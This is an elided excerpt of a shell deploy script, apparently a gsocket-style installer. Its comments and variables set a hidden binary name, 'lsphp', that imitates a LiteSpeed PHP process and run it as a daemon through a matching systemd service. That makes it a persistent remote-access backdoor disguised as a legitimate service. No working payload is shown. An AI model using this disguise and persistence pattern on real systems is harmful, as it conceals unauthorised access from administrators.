...
# GS_BIN_HIDDEN_NAME="lsphp"
#       - Specify custom name for binary on filesystem (default is lsphp)
...
BIN_HIDDEN_NAME_RM=("$BIN_HIDDEN_NAME_DEFAULT" "lsphp" "lsphp")
...
init_vars()
{
	...
	# 'killall' however matches lsphp and on OSX we thus force killall
	...
	# Defaults
	# Binary file is called lsphp or set to same name as Process name if
...
init_setup()
{
	...
	# Do not add TERM= or SHELL= here because we do not like that to show in lsphp.service
	...
	# 2. Otherwise start lsphp as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
...
gs_start()
{
	...
	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill lsphp'
	# ./deploy.sh -> re-installs new secret. Start lsphp with _new_ secret.
	# Now two lsphp are running (which is correct)
	if [[ -n "$KL_CMD" ]]; then
